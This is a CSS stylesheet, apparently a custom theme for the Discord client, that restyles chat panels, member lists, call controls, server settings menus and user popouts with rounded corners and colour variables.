/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.attachment-33OFj0 {
    border: none;
    background-color: var(--Color005);
	border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | New Message |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.unreadPill-2HyYtt{
	background: var(--Color001);
    border-radius: 90px;
    padding: 6px;

margin-right: -2px;
    width: 3%;
}

.unreadPillCap-3_K2q2{
    display: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Message Divider |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

:root .divider-JfaTT5{
    border:  1px solid var(--Color001);
    margin-left: 0px;
    margin-right: 22px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Time Divider ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.content-1o0f9g {
    background: var(--Color003);
    border-radius: 90px;
    width: 100%;
    padding: 8px;
    text-align: center;
	padding-right: 50px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | New Member ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Text */

.content-2M3n_H {
	padding-left: 34px;
}

/* Icon */

.iconContainer-3GkGRf {
    position: absolute;
    left: 4px;
    padding-top: .16rem;
}

/* Background */

.container-3-pyIM {
	background: var(--Color003);
	border-radius: 90px;
	padding: 8px
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Code Menu |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.markup-2BOw-j code {
    background: var(--Color005);
    border: transparent;
    border-radius: 8px;
}

.hljs .powercord-lines:after {
    padding-right: 8px;
    left: 3px;
    border-right: 1px solid var(--Color005);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Emoji Info ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.emojiSection-3Fb9ix {
    background: var(--Color005);

}

.container-ZRw2kD {
    width: auto;
    border-radius: 24px;
	box-shadow: 0px 8px 12px -2px var(--Color005);
}

.guildSection-1EoFKd {
    background: var(--Color004);
    padding: 16px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Follow Channel ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.wrapper-39oAo3 {
    background-color: var(--Color005);
    border-radius: var(--Radius001);
    margin-bottom: 0px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Chatbox Panel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Typing */

.typing-2GQL18 {
    position: sticky;
	z-index: 4;
    margin-bottom: -28px;
    margin-left: 0px;
    padding-top: 4px
}

.base-gE7OpD {
    color: var(--Color008);
    font-size: 12px;
    font-weight: 500;
    line-height: 24px;

}

/* Background */

.scrollableContainer-2NUZem {
	position: relative;
    background: var(--Color005);
    max-height: 37vh;
  	border-radius: 24px;
	z-index: 90;
	padding-top: 4px;
	padding-bottom: 4px;
    padding-right: 12px;
}

.scrollableContainer-2NUZem::-webkit-scrollbar {
    display: none;

}




.form-2fGMdU {
    padding-left: 0px;
    padding-right: 0px;

}

.characterCount-1cRDo2 {
	z-index: 3;
}

.channelTextArea-rNsIhG {
    margin-bottom: -3px;
	border-radius: 24px;
}

.theme-dark .form-2fGMdU:before {
	background: transparent;
}

/* Text Align */

.slateTextArea-1Mkdgw {
    text-align: left;
	margin-left: 12px;
}

.placeholder-37qJjk {
    left: 28px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Member Panel ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.members-1998pB, .members-1998pB>div {
    background-color: var(--Color004);
	border-radius: 24px;
	margin-left: 12px;
    margin-bottom: 25px;
}

.members-1998pB {
    width: 236px;
    padding-bottom: 40px;

}

.member-3-YXUe {
    margin-left: 2px;
    padding-right: 8px;
}


/* Bot Tags */

.botTag-2WPJ74 {
    border-radius: 24px !important;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Home ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/*  Sidebar */

.scroller-1JbKMe {
    background: var(--Color004);
    border-top-right-radius: 20px;
    border-top-left-radius: 20px;
}

#app-mount .sidebar-2K8pFh {
    background: transparent !important;
    border-radius: 23px;
    margin-top: 12px;
    margin-right: 12px;
    margin-left: 12px;
    margin-bottom: 24px;
}

.layout-2DM8Md {
    border-radius: 90px;
    margin-right: 12px;
    margin-left: 6px;
}

/* Sidebar Button */

.selected-aXhQR6 .layout-2DM8Md {
    background: var(--Color003);
}

/* Searchbar */

.privateChannels-1nO12o {
    background: transparent;
    margin-bottom: -20px;
}

.searchBar-6Kv8R2 .searchBarComponent-32dTOx {
    background: var(--Color005);
    color: var(--Color009);
    border-radius: 90px;


    margin-right: 6px;
    margin-left: 4px;

    height: 28px;
    overflow: hidden;

    -webkit-box-shadow: none;
    box-shadow: none;

    text-align: center;
}



/* Topbar */

.topPill-30KHOu .item-PXvHYJ {
    border-radius: 94px;
    margin: 0 8px;
    padding: 2px 12px;
}

/*  Friendstatus */

.peopleColumn-29fq28 {
	border-radius: 24px;
    background: var(--Color004);
}

.tabBody-3YRQ8W {
    background: var(--Color003);
    padding-bottom: 25px;
}

/*  Friendstatus | Buttons*/

.actionButton-uPB8Fs {
    background: var(--Color003);
}

/*  Friendstatus | Avatar*/

.wrapper-3t9DeA, .avatar-3W3CeO {
    background: transparent;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Home | Active Now |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* No Header */

.header-13Cw0- {
	display: none;
}

/* Empty Card */

.emptyCard-1RJw8n {
    border-radius: 24px;
    padding: 24px;
}

/* Background */

.nowPlayingScroller-2XrVUt {
    padding-top: 0px;
    padding-left: 12px;
}

.wrapper-3D2qGf {
    background-color: var(--Color004);
  	border-radius: 24px;
}

.nowPlayingColumn-2sl4cE {
    background: var(--Color003);

}

.emptyCard-1RJw8n {
    background: var(--Color004);
}

/* Items */

.section-2gLsgF {
	background: var(--Color003);
  	border-radius: 24px;
    position: relative;
    padding: 12px;
}

.theme-dark .inset-3sAvek {
    background-color: transparent;
}

/* Activity Avatar */

.activitySectionAssets-32WyHu .largeImage-DLXk-f {
	border-radius: 90px;
    width: 32px;
    height: 32px;
}

/* Divider */

.theme-dark .separator-XqIyoz {
    background-color: transparent;
	padding-top: 8px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Home | Nitro ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.homeWrapperNormal-2KSUEa {
    height: 100%;
    background: var(--Color003);
}

.scroller-9moviB {
    background: var(--Color004);
    border-radius: var(--Radius001);
    margin-right: 12px;
    margin-bottom: 24px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Call ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/*  Toolbar */

.headerWrapper-3NUKsd {
    padding-top: 6px;
}


/*  Status */

.status-1WEaea {
    background: var(--Color001);
    color: var(--Color006);
}

.wrapper-2qzCYF.minimum-28Z35l {
    height: 280px;
    background: var(--Color003);
}


.voiceCallWrapper-3kPwHm {
    background: var(--Color004);
}

/*  Buttons */

.colorable-1bkp8v.primaryDark-3mSFDl, .colorable-1bkp8v.primaryDark-3mSFDl .centerIcon-2G6o-T {
    color: var(--Color007);
}

.colorable-1bkp8v.primaryDark-3mSFDl {
    background: var(--Color003);
    border-radius: var(--Radius002);
}


.colorable-1bkp8v.red-33-Lnk {
    background: var(--Color001);
    border-radius: var(--Radius002);
}

.colorable-1bkp8v.red-33-Lnk:hover {
    background: var(--Color001);
    border-radius: var(--Radius002);
    filter: brightness(110%);
}

/*  Background */

.flexCenter-2Y_vCg .wrapper-2qzCYF.fullScreen-1tMzXY, .wrapper-2qzCYF.noChat-18KtBD {
    background: var(--Color003);
}

.wrapper-3EGhDO {
    background: var(--Color004);
    padding: 6px 6px 6px 6px;
    border-radius: var(--Radius002);
}

/*  Call Dock */
/*
div[class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyCenter-3D2jYp alignCenter-1dQNNs noWrap-3jynv6"][style="flex: 1 1 auto;"]{
    border-radius: 30px;
    margin-bottom: 21px;
    background: var(--Color004);
}


.colorable-1bkp8v.white-3GPOIp, .colorable-1bkp8v.white-3GPOIp .centerIcon-2G6o-T {
    color: currentColor;
}

.colorable-1bkp8v.primary-3NQg8g,
.colorable-1bkp8v.primary-3NQg8g.active-1QRrIS, .colorable-1bkp8v.primary-3NQg8g:hover,
.colorable-1bkp8v.white-3GPOIp,
.centerButton-3CaNcJ,
.colorable-1bkp8v.white-3GPOIp.active-1QRrIS, .colorable-1bkp8v.white-3GPOIp:hover,
.colorable-1bkp8v.red-33-Lnk {
    background: none  ;
}
*/

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Call | Picture in Picture |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.pictureInPictureWindow-1B5qSe{
    border-radius: var(--Radius001);
    width: 440px;
    height: 248px;
    opacity: var(--picture-in-picture);
}

.pictureInPictureWindow-1B5qSe:hover{
        opacity: 100%;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Discover  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.headerImage-3X1tyY, .searchSubtitle-2jsC5X, .searchTitle-36D1cB {
    display: none;
}

#app-mount .sidebar-2K8pFh {
    background: var(--Color004);
}

.theme-dark .pageWrapper-1PgVDX {
    border-radius: 24px;
    background: var(--Color004);
    padding: 0px 0px 0px 0px;
    margin: 12px 13px 25px 12px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Discover | Searchbar  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Search Bar */

.search-1iTphC .searchBox-2_mAlO {
    background-color: var(--Color005);
    border-radius: 90px;
    box-shadow: none;
}

.searchHeader-2I26nG {
    margin-bottom: 0px;
    min-height: 0px;
    padding-bottom: 40px;
}

.search-1iTphC .searchBox-2_mAlO .searchBoxInput-K6mkng {
    color: var(--Color008);
    font-size: 16px;
    padding-left: 24px;
}

.search-1iTphC .searchBox-2_mAlO:focus, .search-1iTphC .searchBox-2_mAlO:focus-within {
    box-shadow: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Discover | Server Card  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/


/* Background */

.theme-dark .card-3DjzTQ, .theme-dark .iconMask-3b8GzQ {
    background: var(--Color005);
    border-radius: 24px;
	box-shadow: none;
}

.guildListSection-2CS8vH {
    padding-top: 20px;
}

/* Avatar */

.avatar-22otdK {
    border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Overview  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.flag-16iIBd {
    position: relative;
    border-radius: 90px;
    margin-left: 2px;
    width: 36px;
    height: 24px;
}

.theme-dark .container-1nZlH6 {
    background: var(--Color005);
	border: none;
	border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Roles  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Sidebar */

.scroller-305q3I {
    background: var(--Color004);
    border-radius: var(--Radius001);
    margin-top: 60px;
}

/* Content */

.contentColumnMinimal-2iX-kP {
    background: var(--Color004);
    border-radius: 24px 24px 0 0;
    margin-top: 60px;
    margin-left: 60px;
    margin-right: 60px;
    margin-bottom: 0px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Emoji  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Moderation  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.checkbox-1ix_J3 {
    -webkit-box-flex: 0;
    -ms-flex: 0 0 auto;
    flex: 0 0 auto;
    border-width: 1px;
    border-style: solid;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    border-radius: 90px;
}

.defaultMarginh3-2iptLs, .defaultMarginh5-2mL-bP {
    margin-bottom: 12px;
    margin-top: 12px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Audit Log  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.contentRegion-3nDuYy {
    background: var(--Color003);
}


/* Content */

.customScroller-26gWhv>div {
    background: var(--Color004);
    border-radius: 24px 24px 0 0;
    margin-top: 60px;
    margin-left: 60px;
    margin-right: 60px;
    margin-bottom: 0px;
    padding: 40px;
}


/* Card */

.theme-dark .auditLog-3jNbM6 {
	border: none;
}

.theme-dark .divider-1pnAR2 {
    display: none;
}

/* Card | Closed */

.theme-dark .headerClickable-2IVFo9, .theme-dark .headerDefault-1wrJcN {
    background: var(--Color005);
	border-radius: var(--Radius001);
}

/* Card | Open */

.theme-dark .headerExpanded-CUEwZ5 {
    background: var(--Color005);
	border-radius: var(--Radius001) var(--Radius001) 0 0;
}


.theme-dark .changeDetails-bk98pu {
    background: var(--Color003);
	border-radius: 0 0 var(--Radius001) var(--Radius001);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Integrations  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Widget  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Input */

.theme-dark .copyInputDefault-21sXtF {
    border: none;
}

.theme-dark .copyInput-2rOSt7 {
    background: var(--Color005);
    border-radius: var(--Radius001);
}



/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Server Template  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Community | Overview  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Welcome Screen  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.enableContainer-6E-puu {
    background: var(--Color003);
    filter: brightness(110%);
    border-radius: var(--Radius001) var(--Radius001) 0 0;
}

.previewContainer-1SS3uO {
    background: var(--Color003);
    padding: 16px;
    border-radius: 0 0 var(--Radius001) var(--Radius001);

}

/* Description */

.descriptionWrapper-1GiGtP {
    width: 100%;
    max-width: 900px;
    margin: 0 auto;
}

.input-cIJ7To::-webkit-scrollbar {
    display: none;
}

/* Text */

.descriptionInput-3b30C8[placeholder] {
    text-align: left;
    padding-right: 24px;
    padding-left: 24px;
}

/* Cards */

.welcomeChannel-1rFrIO {
    border-radius: var(--Radius002);
    background-color: var(--background-primary);
    margin-top: 8px;
    padding: 20px 20px;
}

.theme-dark .lookFilled-1Gx00P.colorPrimary-3b3xI6 {
    color: var(--Color006);
    background: var(--Color001);
}

/* Button */

.theme-dark .lookFilled-1Gx00P.colorPrimary-3b3xI6:hover {
    color: var(--Color006);
    background: var(--Color001);
    filter: brightness(120%);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Login |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark.authBox-hW6HRx {
    color: #72767d;
    background: var(--Color004);
}

.fallbackImage-31Sk4m {
    display: none;
}

.platform-win .splashBackground-1FRCko:before {
    display: none;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | User Popout ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Header */

.header-2BwW8b {
    background: var(--Color003);
    padding-bottom: 0px;
}

.reduce-motion .userPopout-3XzG_A {
    background: var(--Color003);
}

/* Background */

.theme-dark .headerNormal-T_seeN {
    background: var(--Color003)
}

.theme-dark .body-3iLsc4, .theme-dark .footer-1fjuF6 {
    background: var(--Color004);
    color: var(--Color006);
}

.userPopout-3XzG_A {
	box-shadow: var(--shadow001);
    width: 260px;
    border-radius: 24px;
    max-height: calc(90vh - 120px);
}

.bodyInnerWrapper-Z8WDxe {
    padding-right: 20px;
}

/* Activity */

.activity-11LB_k {
    background: var(--Color003);
    padding: 16px;
}

/* Status */

